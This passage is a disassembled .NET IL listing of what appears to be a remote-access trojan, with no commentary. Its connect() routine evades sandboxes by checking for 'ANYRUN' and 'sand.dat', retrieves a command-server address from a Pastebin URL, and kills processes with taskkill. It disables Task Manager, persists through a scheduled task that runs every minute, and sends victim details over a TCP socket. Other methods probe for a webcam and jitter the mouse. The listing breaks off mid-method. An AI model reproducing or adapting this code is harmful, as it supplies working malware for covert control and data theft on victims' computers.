    IL_0021:  ldc.i4.0
    IL_0022:  ldloc.2
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_002d:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0032:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003c:  stloc.1
    IL_003d:  ldloc.s    V_4
    IL_003f:  ldc.i4.1
    IL_0040:  add.ovf
    IL_0041:  stloc.s    V_4
    IL_0043:  ldloc.s    V_4
    IL_0045:  ldloc.3
    IL_0046:  ble.s      IL_001e

    IL_0048:  ldloc.1
    IL_0049:  ret
  } // end of method OK::RN

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage(int32 hWnd,
                            uint32 msg,
                            uint32 wParam,
                            int32 lparam) cil managed preservesig
  {
  }
  .method private static void  Mouse() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             valuetype [System.Drawing]System.Drawing.Point V_7)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Mouse()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0017:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001c:  stloc.3
    IL_001d:  ldloca.s   V_3
    IL_001f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0024:  stloc.1
    IL_0025:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_002a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_002f:  stloc.3
    IL_0030:  ldloca.s   V_3
    IL_0032:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.1
    IL_0039:  stloc.s    V_4
    IL_003b:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0040:  dup
    IL_0041:  ldc.i4.0
    IL_0042:  ldloc.2
    IL_0043:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0048:  stloc.s    V_5
    IL_004a:  ldc.i4.0
    IL_004b:  ldloc.1
    IL_004c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0051:  stloc.s    V_6
    IL_0053:  ldloca.s   V_7
    IL_0055:  ldloc.s    V_5
    IL_0057:  call       instance void [System.Drawing]System.Drawing.Point::set_X(int32)
    IL_005c:  ldloca.s   V_7
    IL_005e:  ldloc.s    V_6
    IL_0060:  call       instance void [System.Drawing]System.Drawing.Point::set_Y(int32)
    IL_0065:  ldloc.s    V_7
    IL_0067:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
    IL_006c:  ldc.i4.s   50
    IL_006e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0073:  ldloc.s    V_4
    IL_0075:  ldc.i4.1
    IL_0076:  add.ovf
    IL_0077:  stloc.s    V_4
    IL_0079:  ldloc.s    V_4
    IL_007b:  ldc.i4.s   100
    IL_007d:  ble.s      IL_003b

    IL_007f:  ldloc.0
    IL_0080:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_0085:  ret
  } // end of method OK::Mouse

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed noinlining nooptimization
  {
    // Code size       1122 (0x462)
    .maxstack  5
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             int32 V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             object V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             string V_12,
             string V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15)
    IL_0000:  ldsfld     bool j.OK::ANYRUN
    IL_0005:  brfalse.s  IL_006c

    IL_0007:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_000c:  ldstr      "sand.dat"
    IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0016:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_001b:  brfalse.s  IL_0029

    IL_001d:  ldstr      "127.0.0.1"
    IL_0022:  stsfld     string j.OK::H
    IL_0027:  br.s       IL_003d

    IL_0029:  newobj     instance void Form2::.ctor()
    IL_002e:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
    IL_0033:  ldc.i4     0x7d0
    IL_0038:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_003d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0042:  ldstr      "sand.dat"
    IL_0047:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004c:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0051:  brfalse.s  IL_006c

    IL_0053:  ldstr      "127.0.0.1"
    IL_0058:  stsfld     string j.OK::H
    IL_005d:  call       void j.OK::UNS()
    IL_0062:  call       void [System.Windows.Forms]System.Windows.Forms.Application::Exit()
    IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_006c:  ldsfld     bool j.OK::PasteE
    IL_0071:  brfalse    IL_010a

    IL_0076:  ldsfld     string [mscorlib]System.String::Empty
    IL_007b:  stloc.0
    IL_007c:  ldc.i4.0
    IL_007d:  stloc.2
    IL_007e:  ldc.i4.s   50
    IL_0080:  stloc.3
    IL_0081:  ldc.i4.0
    IL_0082:  stloc.s    V_4
    IL_0084:  br.s       IL_00b8

    IL_0086:  nop
    .try
    {
      IL_0087:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_008c:  ldsfld     string j.OK::PASTEBIN
      IL_0091:  call       instance string [System]System.Net.WebClient::DownloadString(string)
      IL_0096:  stloc.0
      IL_0097:  leave.s    IL_00b8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0099:  dup
      IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009f:  stloc.s    V_5
      IL_00a1:  ldloc.s    V_4
      IL_00a3:  ldc.i4.1
      IL_00a4:  add.ovf
      IL_00a5:  stloc.s    V_4
      IL_00a7:  ldc.i4     0x1388
      IL_00ac:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00b6:  leave.s    IL_00b8

    }  // end handler
    IL_00b8:  ldloc.0
    IL_00b9:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00be:  brfalse.s  IL_00c5

    IL_00c0:  ldloc.s    V_4
    IL_00c2:  ldloc.3
    IL_00c3:  blt.s      IL_0086

    IL_00c5:  ldloc.0
    IL_00c6:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00cb:  brtrue.s   IL_0105

    IL_00cd:  ldloc.0
    IL_00ce:  ldc.i4.1
    IL_00cf:  newarr     [mscorlib]System.Char
    IL_00d4:  dup
    IL_00d5:  ldc.i4.0
    IL_00d6:  ldc.i4.s   58
    IL_00d8:  stelem.i2
    IL_00d9:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_00de:  stloc.1
    IL_00df:  ldloc.1
    IL_00e0:  ldlen
    IL_00e1:  conv.i4
    IL_00e2:  ldc.i4.1
    IL_00e3:  sub.ovf
    IL_00e4:  stloc.s    V_6
    IL_00e6:  ldc.i4.0
    IL_00e7:  stloc.2
    IL_00e8:  br.s       IL_00fe

    IL_00ea:  ldloc.1
    IL_00eb:  ldc.i4.0
    IL_00ec:  ldelem.ref
    IL_00ed:  stsfld     string j.OK::H
    IL_00f2:  ldloc.1
    IL_00f3:  ldc.i4.1
    IL_00f4:  ldelem.ref
    IL_00f5:  stsfld     string j.OK::P
    IL_00fa:  ldloc.2
    IL_00fb:  ldc.i4.1
    IL_00fc:  add.ovf
    IL_00fd:  stloc.2
    IL_00fe:  ldloc.2
    IL_00ff:  ldloc.s    V_6
    IL_0101:  ble.s      IL_00ea

    IL_0103:  br.s       IL_010a

    IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_010a:  ldc.i4.0
    IL_010b:  stsfld     bool j.OK::Cn
    IL_0110:  ldc.i4     0x7d0
    IL_0115:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_011a:  ldsfld     bool j.OK::KProc
    IL_011f:  brfalse.s  IL_013d

    IL_0121:  ldstr      "taskkill /f im "
    IL_0126:  ldsfld     string j.OK::Proc
    IL_012b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0130:  ldc.i4.0
    IL_0131:  ldc.i4.1
    IL_0132:  ldc.i4     0x1388
    IL_0137:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_013c:  pop
    IL_013d:  ldsfld     bool j.OK::TaskMGR
    IL_0142:  brfalse.s  IL_0149

    IL_0144:  call       void Stub.NoTsk::Start()
    IL_0149:  ldsfld     bool j.OK::Sched
    IL_014e:  brfalse    IL_01db

    .try
    {
      IL_0153:  ldstr      "schtasks /delete /tn \""
      IL_0158:  ldsfld     string j.OK::SCHEDNAME
      IL_015d:  ldstr      "\" /f"
      IL_0162:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0167:  ldc.i4.0
      IL_0168:  ldc.i4.1
      IL_0169:  ldc.i4     0x1388
      IL_016e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0173:  pop
      IL_0174:  ldc.i4.5
      IL_0175:  newarr     [mscorlib]System.String
      IL_017a:  dup
      IL_017b:  ldc.i4.0
      IL_017c:  ldstr      "schtasks /create /sc minute /mo 1 /tn \""
      IL_0181:  stelem.ref
      IL_0182:  dup
      IL_0183:  ldc.i4.1
      IL_0184:  ldsfld     string j.OK::SCHEDNAME
      IL_0189:  stelem.ref
      IL_018a:  dup
      IL_018b:  ldc.i4.2
      IL_018c:  ldstr      "\" /tr "
      IL_0191:  stelem.ref
      IL_0192:  dup
      IL_0193:  ldc.i4.3
      IL_0194:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_0199:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_019e:  stelem.ref
      IL_019f:  dup
      IL_01a0:  ldc.i4.4
      IL_01a1:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_01a6:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_01ab:  stelem.ref
      IL_01ac:  call       string [mscorlib]System.String::Concat(string[])
      IL_01b1:  ldc.i4.0
      IL_01b2:  ldc.i4.1
      IL_01b3:  ldc.i4     0x1388
      IL_01b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01bd:  pop
      IL_01be:  leave.s    IL_01db

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01c0:  dup
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  stloc.s    V_7
      IL_01c8:  ldloc.s    V_7
      IL_01ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d9:  leave.s    IL_01db

    }  // end handler
    IL_01db:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_01e0:  stloc.s    V_8
    IL_01e2:  ldloc.s    V_8
    IL_01e4:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_01e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_01ee:  brfalse.s  IL_021d

        .try
        {
          IL_01f0:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_01f5:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_01fa:  ldnull
          IL_01fb:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0200:  leave.s    IL_021d

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0202:  dup
          IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0208:  stloc.s    V_9
          IL_020a:  ldloc.s    V_9
          IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_021b:  leave.s    IL_021d

        }  // end handler
        IL_021d:  nop
        .try
        {
          IL_021e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_0223:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0228:  leave.s    IL_0245

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_022a:  dup
          IL_022b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0230:  stloc.s    V_10
          IL_0232:  ldloc.s    V_10
          IL_0234:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0239:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0243:  leave.s    IL_0245

        }  // end handler
        IL_0245:  leave.s    IL_0262

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0247:  dup
        IL_0248:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_024d:  stloc.s    V_11
        IL_024f:  ldloc.s    V_11
        IL_0251:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0256:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_025b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0260:  leave.s    IL_0262

      }  // end handler
      IL_0262:  nop
      .try
      {
        IL_0263:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0268:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_026d:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_0272:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0277:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_027c:  ldc.i4     0x32000
        IL_0281:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_0286:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_028b:  ldc.i4     0x32000
        IL_0290:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_0295:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_029a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_029f:  ldc.i4     0x2710
        IL_02a4:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_02a9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_02ae:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_02b3:  ldc.i4     0x2710
        IL_02b8:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_02bd:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_02c2:  ldsfld     string j.OK::H
        IL_02c7:  ldsfld     string j.OK::P
        IL_02cc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_02d1:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_02d6:  ldc.i4.1
        IL_02d7:  stsfld     bool j.OK::Cn
        IL_02dc:  call       string j.OK::inf()
        IL_02e1:  call       bool j.OK::Send(string)
        IL_02e6:  pop
        .try
        {
          IL_02e7:  ldstr      "vn"
          IL_02ec:  ldstr      ""
          IL_02f1:  call       object j.OK::GTV(string,
                                                object)
          IL_02f6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_02fb:  ldstr      ""
          IL_0300:  ldc.i4.0
          IL_0301:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_0306:  brfalse.s  IL_0322

          IL_0308:  ldloc.s    V_12
          IL_030a:  ldsflda    string j.OK::VN
          IL_030f:  call       string j.OK::DEB(string&)
          IL_0314:  ldstr      "\r\n"
          IL_0319:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_031e:  stloc.s    V_12
          IL_0320:  br.s       IL_0352

          IL_0322:  ldloc.s    V_12
          IL_0324:  ldstr      "vn"
          IL_0329:  ldstr      ""
          IL_032e:  call       object j.OK::GTV(string,
                                                object)
          IL_0333:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0338:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_033d:  stloc.s    V_13
          IL_033f:  ldloca.s   V_13
          IL_0341:  call       string j.OK::DEB(string&)
          IL_0346:  ldstr      "\r\n"
          IL_034b:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0350:  stloc.s    V_12
          IL_0352:  ldc.i4.s   16
          IL_0354:  newarr     [mscorlib]System.String
          IL_0359:  dup
          IL_035a:  ldc.i4.0
          IL_035b:  ldloc.s    V_12
          IL_035d:  stelem.ref
          IL_035e:  dup
          IL_035f:  ldc.i4.1
          IL_0360:  ldsfld     string j.OK::H
          IL_0365:  stelem.ref
          IL_0366:  dup
          IL_0367:  ldc.i4.2
          IL_0368:  ldstr      ":"
          IL_036d:  stelem.ref
          IL_036e:  dup
          IL_036f:  ldc.i4.3
          IL_0370:  ldsfld     string j.OK::P
          IL_0375:  stelem.ref
          IL_0376:  dup
          IL_0377:  ldc.i4.4
          IL_0378:  ldstr      "\r\n"
          IL_037d:  stelem.ref
          IL_037e:  dup
          IL_037f:  ldc.i4.5
          IL_0380:  ldsfld     string j.OK::DR
          IL_0385:  stelem.ref
          IL_0386:  dup
          IL_0387:  ldc.i4.6
          IL_0388:  ldstr      "\r\n"
          IL_038d:  stelem.ref
          IL_038e:  dup
          IL_038f:  ldc.i4.7
          IL_0390:  ldsfld     string j.OK::EXE
          IL_0395:  stelem.ref
          IL_0396:  dup
          IL_0397:  ldc.i4.8
          IL_0398:  ldstr      "\r\n"
          IL_039d:  stelem.ref
          IL_039e:  dup
          IL_039f:  ldc.i4.s   9
          IL_03a1:  ldsfld     bool j.OK::Idr
          IL_03a6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03ab:  stelem.ref
          IL_03ac:  dup
          IL_03ad:  ldc.i4.s   10
          IL_03af:  ldstr      "\r\n"
          IL_03b4:  stelem.ref
          IL_03b5:  dup
          IL_03b6:  ldc.i4.s   11
          IL_03b8:  ldsfld     bool j.OK::IsF
          IL_03bd:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03c2:  stelem.ref
          IL_03c3:  dup
          IL_03c4:  ldc.i4.s   12
          IL_03c6:  ldstr      "\r\n"
          IL_03cb:  stelem.ref
          IL_03cc:  dup
          IL_03cd:  ldc.i4.s   13
          IL_03cf:  ldsfld     bool j.OK::Isu
          IL_03d4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03d9:  stelem.ref
          IL_03da:  dup
          IL_03db:  ldc.i4.s   14
          IL_03dd:  ldstr      "\r\n"
          IL_03e2:  stelem.ref
          IL_03e3:  dup
          IL_03e4:  ldc.i4.s   15
          IL_03e6:  ldsfld     bool j.OK::BD
          IL_03eb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_03f0:  stelem.ref
          IL_03f1:  call       string [mscorlib]System.String::Concat(string[])
          IL_03f6:  stloc.s    V_12
          IL_03f8:  ldstr      "inf"
          IL_03fd:  ldsfld     string j.OK::Y
          IL_0402:  ldloca.s   V_12
          IL_0404:  call       string j.OK::ENB(string&)
          IL_0409:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_040e:  call       bool j.OK::Send(string)
          IL_0413:  pop
          IL_0414:  leave.s    IL_0431

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0416:  dup
          IL_0417:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_041c:  stloc.s    V_14
          IL_041e:  ldloc.s    V_14
          IL_0420:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0425:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_042a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_042f:  leave.s    IL_0431

        }  // end handler
        IL_0431:  leave.s    IL_045c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0433:  dup
